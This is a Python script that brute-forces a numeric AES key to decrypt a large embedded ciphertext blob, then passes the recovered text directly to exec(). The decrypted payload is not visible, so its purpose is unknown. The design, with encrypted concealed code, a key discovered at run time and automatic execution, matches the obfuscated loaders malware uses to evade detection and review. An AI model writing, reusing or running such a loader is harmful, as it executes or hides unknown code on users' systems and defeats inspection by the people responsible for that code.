from Crypto import Random
from Crypto.Cipher import AES
import hashlib

class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				print(f"\rPassword : {self.password}", end="")
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'\xf7\xdd\xd8\xf9\x03a\xe7J\nnstw\xfa\\\x99\x9f\xe8;\xfd\xc0I\x0eT\x83\x1f\x8e\xce\xf3!\x19\xd5;b\xbe\x81\xba\x11\xe1\xdb\xcd\xfa^\xb8\x08\x8b\xccX\x98\xba\x93\xa9\x0b\xc4Y#\xbf\x0e\x0f\xca\xb7\xfa\x0b\x8e\x0c\x85\xdb[\x94 9e\xbew\x8dV\xe9\x03\xa0a\xb55\xd8\x14\xb5\x14\x80\x08\t\x15oD\x8dy\x82\xf2\xab\xbb\xd3\x9aC\xb0\xe4A\xc9\xf1Ne\xa0\xacd3r\x99\xbe\xd9Y\xfaVt\x1a\x03D\xabG\x94\xfc/\xce\x04\xbb\xc4\x1d\xa8\xe2_\xc5\xc9\xe1\r\x95CD\xeb\x98U\xf8\x17\xf0]\x9e\xd3\xf6\xbd\xe0\xa4M\xfe\xbb\x7f\xca4\x19\xc9`\x81e\x88\x9b\x1f\xb9\t(\x8f\xc0\x14A\xbe\x9e\x1c\x90\xecWc\x0bw!U\xda\x9d\xbe\'{\xce\x0e\xbc6\xe3\x9e\xa6\x16\xb3\xa7\x8c\xfe9\xba\xb4\xff\x8e.\x04\x04\xbb$\xd0#%\x82\xd2u\xae\x97\xe5\xbd\xd1oBq\x8f\x06\x02.8B\x08\x98|\xf48\xd0\x93\xdbz\xbc\x9b\xc8<\xac\x0e\xd9\xb9\x1d\t\x98\xd6\xf52\x0c|a\x9d\x11\xd9\xb3J(Cv\\\x08\xd3dxf/\xcf\x81\xe3!yf\x8fj$P\x88\xf6*\xd7\xb8V\xf9\xaa\x82\x8b\x1a\xac\xd0A\xf0\xac\xcd\xdc\xc3\x1du\xb7\x99\x91S\xebY\x9d\x91\x14\xf5@\x7f\x1dp\x93ID\xee\xf8\xbax\x1c\x01\x11Q\xfe\x8f\x97\x19\x1eDo\x1fv\xadn-Lk(\xe6a%v\x00\xa1N\xcd\x0e\xfb\x8b\xbaKiH\xe86"b\xc0i\xfa\xcf\x11\xaeN^\x8a\xf9\xbc@\t\xdf\xdaLq\x82\x96\xb7>\xc6\xa5\xfd\xd3\xfe9\xf2\xbc\x91F\xb7"\xf6\xb4\xeb\xac\x87\xcbc\xbf\xe6\x1d\xa6\xdcf\x87+\xaa>d|\xda\x1d\x1eWXKYl\xe4\x14\x0e\x03\xb1.T\xfb?\xdd\xe4aK%\x86\x80\xf40,\xcc\xe2T\xf6R{\x9b\x11\xdb\x84\xefL\xd9i\xbc)\x1ex\xae\xcd\x92y\xb5\xd9&\xd2*\x98]\xad\xa4\x83\xcb\xa9\xfc\xc0Q\xdf\xfc\x1e\xd8\xbd8\x94\x1a|\xf4\xa4\xc3\xed\x0b\x0c\xeb\x8db\xb3\x88 \xf7T\x8f\xc6\n\xf1g\xd90=u$%D\xb1\xe7\xda\xf5D\xcd\xc9\xce\xe3\x9c\xa8\xa3O\xb6\xc7\x8f:\x8a\xd1yp\xed\xdeT\xdb\xd1\xf6\x8bP\xe6\xb1\xdfI6Z,\xc6\xca\xd9A-\xdf*H\x0b\xee\n\xc2}\xa9\x1e\xb9v\xeeA&\xd8\xe6\xaa\x8e`\x84\x90\xa2\xe5\xfdW\xc0\xb1\x9e\xd5\xcb}\x04\rO\x06\xeaY\xdf\xee+\xa80sZ\xe3{2\x17\x8cg\xc0A\xd2\x0c\x18\x01\x87\x8a\x8d\x82\x10i\'\x9a\x1e\xe4\xe4\x88\xfa\xaa\xe8\x04\xf8oP#~\xf9\x1f\x1c\x9c\xe5\x0c\xf5+3\xf52\xb0\x99\xad\x86\xff\xfaRK\xc9\xd19{\xef\xb9\x90\x14\xd7\xc6\xcd\x1dhvPy\xe5\xb1\xb3\xae\x0bx\xa8\x1cc+\xc4\xaa2b\x81O\xe7\xcd\xc2\xdc7\xd6\xebu(\xdf\xd4a\xa7\xfe\x0f\xdb\x88\xc5\x18T\xa9\x81o\xe3\r\xf6\xf0\x8d4\xa6r\x15\x04\xe2\xb4\x9f{\tt\x1fj\x18\xf1\xa9\xec@\x89z\xf5\xed@\xe5\x1bWD`\x9d\x11\xbb\xc4I\xd3\x99\xdb\x19\'\xe8WAU\xaa0\x08\tj*i\xc2U\x86\x0c7E\xeb\xe6\x1e\x12\xed\x1b\x94~\x95\x11\xe9\xd1\xd0\xb3\xc4\xd1\xfe\xc2\xc1\xbfIO yJ{8C\xf0(\x19\x91WC\x9a|\xf2\xa6T&\x1aI\x9b\x91F\x02C\xb5\xb8\xdfo\xae\xac6\xe4`b\x03\x1b\xffp\xd9\xdb\xbcQ\xb1\xe5\x8b\xa1{D\xc3hg\xb1\xdf\xe4\xa1\xfb?\x95\xc7\xa8\x06\x00]^,\x96\xabH\xee\x0f\xf9P3\xfd\x11\xc3\xd8+\x84\xf6X\xabD!3]\xdd\xa8\x9f\xffU\xf9Y\xeei\x07\xfdj\xea\x88m\xca\x03\xde\xf62!\x9b\x15\xbe\x0c \x0cs\x1au\xe7\xb5!\x11l\x93\x831R\xbaf\xc7DW\x1f\xac\xac\xba!\x14[\xb0%\x8c\xdd\xe4\xb7\xc1\xc7\xb7\xf0\xf7\xce[\xd8,\x82\xab}\x13\x02k\x01\x16z\r\x7fw\xdb-\x99\xf6\x88\xd3\x1ci/^\xbc\x8e\xc9\xd9\xa6*\x85\xfa,\x87A\xcb\x13Cu\n\xd1\x908\x9f\x8c^\x03x[\x95/\xb2\xeb\r\x17Z\xef[\xdb\x19\xb3\xc9_\x12\xc3\xf8\xd5\x9b)8c\xf9\xd82\xfeV\xd38\x0fg\xc2I\xca\xcf-\xbb3\xc1a\xf7\xc4\xb7\x17\x04Y\xe7\xd9d\xee\xe9\x12sq\xa9t\x1e\xed\x08i@\x9a\x16cC\xb6\x83\xeb\xaf4\x86e\xcc+\xe4\x04\xd1lG\xef\xe9\x92\x8eX\xb28\xa8ua\xf0@\xc9\xa9S\xd3ec\x9b6\x85\x82+8*SGzo\x9c\x0b\x13\xfaj\x94]\xf5\xaay\xca\xc2\xd3a\xf8Ivg|\xce:\x97\xddyVw\xd3\xbc\xe0\x1e\x88\xedv\xc6\x9b\xdd\xb4\xc6C\x98/\xc4\x1c\xb9\x12\x0fe\xa3\xc9\xcf\x13\xb3\xf9\xa8/U\x85hD\xa8\x1f.\x0f\xc2\x90H6\xa0\xfc\x83\xc1\x07Pzi\xd7\x95\xe2\xf4&\x97\n>pWA \xc4 H\x1cO\x01\x07\xb5\x00v]\xfc\'\x81\xc3[nW\xf7\x9aGZ\xa4\xc2|\xa0Y\x80~Kz\xf5\xcb\xed\x1ec\t\xb4\xe6\x15p{\xfa\'2\x8b\x8b\xc5=BtB\xe17\xd3H\xc5\x17\xf1c\xb6\xb5F\x1e\x91y\x01\x817\r,[\x07\x98\xa9\x17$c-\x1a;%\xd3i\x17G\xa3\r\x1d\r\xb7lJ\xbd\x9b\xfbM^\x1b\xdek\xc2\xf4L\xfc\n\xf9\x0c\x96\x91\\\x01\xcbB\xce\x89\xa7\xa4\xec\x91k`\x9c\x1bW\xd4\x998a\xdeY."z\x9e\xed\x16l\x89\xa5\xe48\xb6neA\x84\xc7\x99$\x15\x9a\xd7}5\x83=I\xcb\x89\xce-\xf5\xd0\x89\x9dq\x16 {:\xea)\xcc\xfc\xd8(\xe3mT\x03\x85rX\x05U:\xa02\xc5!\x08\xf4\x19\x83\x1d\xba\xef^N\xb5\xf1\x14\xd9m]q}\x83\xc2S\x05\x0e\x9f\xf0\xd7~\xe8\x91\xa5\\\xe0)\x14U\x94\x07=\xc3T\xdd\xf6\xee\xf3\xdcLb#\xafy\xca\xe1\xaa\xa6\x9f|\xf6t=\xbct\x11&\xc4\xe7;+\xfa\x956\x88r\xe24\x86r\x10B\xca\xa4\xf8\xfa\x13\xdd\x96/\xcf\xc1Q\xf3,\r\x07\xf6\xf3\x8a\x1e<43*\x03\xea\x89M\x98\xf0\xc349wH\x8e\xd4\xed\xd6Bw8b\x05\x9f>0\xc4G\x9a\xbf\x93"\xf2\xfd\x95\x0e"i6t\xed\x81\xe3:\x0c\x9b`\x9d\xd6\xfe\xcb\t\x9c\xb4\\\xe9\xf09\xac?\x01\x18o\xc6~}\x9bU\xe3Y\xe7S\xf7\x8d(\x18\x80\xa5#;\xd7\x8cf]\xe0b\x1c.\xe4\x90j\xcd\x8b[>\xa3F54`Y\x0cp\xf3*]\x9b\xe8 \x15\xeb9r\xcez\xc7-?\x97\x89;\x01\x04\xb8N\xa1\'\n\xc9\xd0t\xb2\x1aD\xc5\xd0\x1c\xa0\xa4s:\xcbj\x0bIS\xc8l\x88\x1d\xd8\xbf#\xc8\x07\xea}\x99L\xd2\x7f\x8f\xe0i\xbb\xb9S\\\xd55\xb4\xd2\x92\xbd\xba[\xae\x9c\xab\xe2\x98\xa6\x11\xbfL\xc1\x10\xb8u\xc0\xc2\xb8?\x84\x84\xa9\x08 \xab\xaa",\xa7\x94\xf4\xba?O\xea\x19\xd4\x0b\xf5\'\xfc\x18\x92\xd5I3t\xe3-\x02\x1b\x10\x93\xd5\x8eE\xc2\x12\xcdG7\x1fM&\x91D3\x85\xec\xe5!gx\x00\xac8\x0b\x18\x04\xea\x0f\xe8\xb1\xf6\x05\xcb\x07c4\xa6\x0cC!\xea\x16\x8bV\x9a\x8b\xa7\x02\xe1~\xecb\xa5\x06\x87\xeb\'Qi0\xaa\xd3\x8b+\xef\xc5]\xfe\xd9f\xcelUM\xd9\xc9\x8f03\x96(\xec\xa1\xff*{1\x15=!\xa5\xa6\x1c\xfc\xfbT\xb2K@\x9cI\xfa\x92Q\xa2\xfd}\xff*\xa9\xc3\x94*K\xc9\xf9%4\x0cRA\xc9\x12j\xd3\x08\xdb\x13\xd6\x9d\x0e\x8c6\x06O<\xd3\xc0\xe6\xf3\x8aM \xf6u\xfbH\xaa\x12+Mm\xa4#:N\xb1_\xfaNA\xfe\x19\\\x9c\xdc\xe2x\xc7l\xc6Q\xf5Z\xe85\xa1I\xcc\x82\x073\x9df\xb8\xd6Q\t\xe38\xe0]\x11\xef\xc2\xcd\xb9\xfa\x083\x1b\xef\xc2\xbbi\x1c\xa7\xbd\x8bO\xc4\xe2Q\xfc\x9f\xf0\x8cm\x8cN \x0e\xd3*\t\'\xa8ll\x7f\xa8\x7f\xa0u7\xfa/\xdcm\x05\xfc\xa85%\x9f\x84\\.\x95\xe31S\x1a[\xd6\rYt2\xc3=h,\x80\x98i\x85\x85-\xb0<\xef\xe0\xce@\xdb\xfb.\n\xf0\x86XM\\\x02\xe290\xeb\xd4\xbe\xfc\xbd\xd8\xad\xf8\x05\xad\xf2\x9b\x99Y\x97\xb5\xfcI\xd1\x84b\x9d\xd4!"7\x81\x90o\xc9\x99\xf4nPk$\xbf\x81\xf0*\xd0\x9c)\x82\x13\xc5@\x1b6\xcf\x84\xe9O\x8b\x03s<\xe9\x13\xa4\xf7b\xfb\xe7\xdc\x80\xd1\x8e\xac\x81| H\'\xb8|3\x91q\xe5\xe0\x0b!\xd5\x8e\xf8/\xf4K\xa9G#\x183\xc8I\x14\xb4.\x8c\x82M[\xed\x9a<\xb9\x03\xc8\xcc\xe9\xdf\x93Y\xeeK\xdcMb\x8b\xfePqDf\x01\x01\xc6N\x87\x04\x0fP\xa0\xf2A\x85\xa1\xe5`\xea\xba\x9a\xb9\x9a\r\xd9Ch\xa0\xe0_\xediIk\x82\x03\xa5\xad(\xcf\xdePK7\x97\xb8\xb7\xbf\xe6\xc9h\x9dR\xb5\x08W\x9d\xfd}\xcf\n\x1eU?\x98\xc2\xfcO\x9a\x88\xe4\x88 \x8f\x0b\xfe|\xbf\x17\xd1z9\xc40\xd8\xb5\xccLr\x81\x7f\xe21o\x8fG\xa5\xdf\xd0\xc4[\xeaw\x80\xf5P\xfa\x82\xaa\xf0\xc4\xd7\xbd\x9b\x867\x9aJ\xca\xebBOr\xfbZ\x84^\xef\xa7\x10\x96\x00\xb0M\xa8V,\xc4(\x1cJ\xf2\x04\xbb\xfa\xe5\xd7:\t\xc2\xe0#\xa5\xdd\x11\xd8B\xda\xd6\xf7\xcf\xe0+j\x1f\xef\x08\xbd\xcf6f\x0f\xd6|\x95\x84\x9ey\x16\x15\x9b\xf3\x15\xe7n}\xb6\x1eW\x9c#\xd9\x0c@G\xc8\x91\x10f\x03\t\xc3\xadV\x1eOr\xd2p\x13\xd4U<\x07~\x97G\x19\x8b\xab\xd7\x87*\x0e\x01\xa5r\xd4q\xa4L\x03\xd5 H\xbd\x18q&\xb9Ux\x0cgD\xae\xb9$\xa0\xbb\x82\xe1\xb7TXq\xa19\xa9\xa6:<\xad\xb2\xfe#\xf1\x93\xae\xbe\xdb\xf8\xa8@\xca\xc5\x87%\x15\xf2\xc4\xee\'\t\xa0\t;<@\xf2\xd2\xa5\xbd\xff\xcd\x02Y\xae\x9c\xc5Q;!}\xedf\xf1k\xb1\xa1\x83\x8e\x1f\x0c$V\xa2_\xfa\xd9\x7f\xd8\xf5]\xd85\xba\xbc\xaf\xf2\xc5\x0c\xd5\xffKA\x87*\xdc\x81\x92e\xb4\xa0\x15\xe1\xd4IG\xdd\xa8\xe4\t\xbc\x01\xda\xc4\x15\xd3y\xbc m\xf5\x929\xc2fgCB3Z\xb5\xbcx\xb2\xa8*\xbd(\xe0?ky\xb87\xdd\'m%\xc3\xb4\xae\xba\xa1\x0b\x0e\xed\xe8Z\x02\xf3\xf0\x18/s\x8b5<\xb2\x84\xf8\xb6\xd2#u}g\xd5kP\x1e\xcb]\xef\xe0X\x8bI\xda\xf5<P\x15>\xb4Q\xe5Q\xa2\xe9\x92\xf7\xf9\xd3\xb3e\x8er\x17\x9c\xcb\xf8\xbb\xf2\n8\x93\x10\xd3\'\xc5\xf3\xee\x91@\x9d\x14#\xa26\x89fx[5\xb5\xf8\x82\x85\xa6\x9eV\x8fs\xec_\x1a\'<\xeb\xe2\xd2\x9c|\x9b]\xb2\xff\x03\xae\x89)\xdc\xf8\xd9B;\r\x1e[\x00\x97\x9b\x85\xf3\x1e\x15\xdf:\x8c;e\xf6\x1d\xfbP\xf2R\x93I=\x03u"%I\xc0\x00\x03\x9d`L\x94\xc64\xf0?\'\x0c\xe2\xdb7\xb7\x9b<\xba\r\x93P\xee\xd01\xb0\xd9o\x87[Y\x7f\xa9wL-? \xcc\x9d\r\xe9c98\xf1 \x1a\\W\x97*\x8f\x16\xf2\xc1\xda\xbe\x9c\x9f\x0819\xcbU\x19\x83\x0b\x84\xc6U\x88&K\x7f\x96\x0bw\x9c\xf1>\x7f\r\x86\\l\xc8p\xf5\x0b\x83?\xfe\\\r\x07\xe7oC\x0f}J\x8ed\'\xe7\x93\xaf\xf4]\x06\xe5j\x97\x95\xaeZ\xa4\x15\xc9\xe3\xcb|;G\xbc5b\x1e\xafG\xc5u\xb8\xbe\xa4\xae\xc5h20\x0c2\xd3\xef\xfe\x11\x97/<\xa9B.\xe9\xb9S\x84U\x01\xab\x99U\xac\xb9\xb5\x1b"\xc9\x11@\xaf\x15\xef\x94u\xa8(\xd9r\xe5\xc7x\xa1\n<\xd0<j\xd6\xa4\xe5\xd6\x01\xd1E\x19$Y\x89\x80\xd0M\x8bfg\x04\xa7r\x12=\x0b\x8e\xf2\xd5YD\xbb\xc9o\x915\x00w\x9c\xb9uU#\xce\xdb\xedb\xe7\xc3\xcf\x9e\xf3W\x91;q\xb7\x1a7J\x84\xcd&\x96g\r\xb2\xc3\xbb\xf8\x94\x8do\xc9z\xc1\x9a\x8c\xb0\xedr\xdb\xc0A\x96=\x0bX\xb2\xe8v\xb5`\xb2\xcc\x07\x01Iv\xf7e\xaa\x16\xc1\x01e\x1fA}\xef\xf6\xbb>\xfa\x1dj\xd8C\xe6\x15\x89\xdd\xe21\xb8\r\x86c\xab\r\xfam\x82\x16\xef\xe1\xfaN\xeaT\x9d\xdf\xef\x05k\x18~\x18\xa0\xa8K\x82\xee\xadQ~\x8fv\x16\xb3\xad\xb7}\x95]K\x82\xc8]\xac\x10\x82FG\xda\xe2\x97\xe7\x84\xae \x9c\xdb\xae+\xbcI\xe8\xad3\xea\x85\xe0\xd6\xd8\x8a\xb1\x96\xbc$\x1f\x07\x8b\xbc?\xebr\x1a\xd8\xec\x80\xa5\x91:1:6\nU\xbb\xbe\xd7^T\xef\x8b;,\xff(#PG\xce\x97\x81\xa3h\xbc\xef_ki\xc6\x1cD\xbd\xe2\x8b\xf4\xc4\xfd\xe0-G\x85?a2\x04&\xc4<_\x14b+\xfc\xb2h\x05p\x15\xd8\xb1\xc3\xf5\xdf\x83\xc6h\xb9V\x1aK%\x10\x89\x13@|\x85z\x82"z\xe3\xa7\x94\xc7\x9cx\x13\xda\xa7\x8e)\x84/\x1b\xb5\xd3\x0b\x0c\xba\xd7\x9d\xaf\xe4\x9e\xcd\x03SN\x91\xeeM/\x93<\xc5g\x1f\xe5\x88#\xf9\xe7l0\xc3\x9b\xa6\x02\xbc\n\xb5\xa4\xea\xceD\x00\xbd\xd4\x99Pd\xe5u\xc7,oY\xe3'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)